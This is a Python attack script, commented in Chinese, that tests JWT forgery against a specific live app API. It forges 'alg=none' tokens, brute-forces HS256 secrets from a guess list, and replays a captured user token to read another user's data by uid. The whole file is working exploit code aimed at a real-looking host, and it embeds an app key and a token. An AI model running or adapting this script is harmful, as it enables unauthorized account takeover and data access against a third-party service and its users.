# -*- coding: utf-8 -*-
"""JWT 伪造测试：alg=none / 弱密钥 HS256 / uid 越权"""
import json, base64, hmac, hashlib, urllib.request, urllib.parse, time

BASE = "https://heootjfch5.842644.xyz"
KEY  = "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2"
API  = BASE + "/appapi"

def b64(d):
    return base64.urlsafe_b64encode(d).decode().rstrip("=")

def mk(payload, secret=None, alg="HS256"):
    h = b64(json.dumps({"typ": "JWT", "alg": alg}, separators=(",", ":")).encode())
    p = b64(json.dumps(payload, separators=(",", ":")).encode())
    if alg == "none":
        return h + "." + p + "."
    sig = hmac.new(secret.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return h + "." + p + "." + b64(sig)

def call(name, extra="", tok=None, data=None, method="GET"):
    url = API + "/" + name + "/appkey/" + KEY + extra
    hdr = {"User-Agent": "okhttp/3.12.0"}
    if tok: hdr["token"] = tok
    body = urllib.parse.urlencode(data).encode() if data else None
    if body: hdr["Content-Type"] = "application/x-www-form-urlencoded"
    r = urllib.request.Request(url, data=body, headers=hdr, method=method)
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, "EXC %s" % e

now = int(time.time())
payload = {"uid": 94970, "iat": now, "exp": now + 86400 * 30, "nonce": "a" * 16, "v": 1}

# 1. alg=none
t = mk(payload, alg="none")
st, b = call("getUserInfo", extra="/userId/94970", tok=t)
print("[alg=none] %s %s" % (st, b[:150]))

# 2. 弱密钥
SECRETS = ["", "secret", "key", "jwt", "msvod", "MsvodX", "123456", "admin", "sm", "sm114",
           "LMrwG8Uwmv6ara4rmvcaQT9PclDXptS2", "msvodx", "thinkphp", "app", "token", "password"]
good = None
for s in SECRETS:
    t = mk(payload, secret=s)
    st, b = call("getUserInfo", extra="/userId/94970", tok=t)
    ok = st == 200 and '"Code":200' in b
    print("  key=%-38r -> %s %s" % (s, st, "ACCEPT" if ok else ("reject" if '"Code":700' in b or '"Code":201' in b else b[:60])))
    if ok:
        good = s
        break
print("GOOD SECRET:", good)

# 3. 原始 token 对照
st, b = call("getUserInfo", extra="/userId/94970",
             tok="eyJ1aWQiOjk0OTcwLCJpYXQiOjE3OTUzNjg2MjAsImV4cCI6MTc5Nzk2MDYyMCwibm9uY2UiOiJiNTQ5YzY4ZDQ3OTA3Y2M5IiwidiI6MX0.9373ed25bfd0883595f85ab8db9ee773ebf6f4a8540b582baf0d3d02732fe3bc")
print("[real token] %s %s" % (st, b[:120]))

# 4. 无 token
st, b = call("getUserInfo", extra="/userId/94970")
print("[no token] %s %s" % (st, b[:120]))
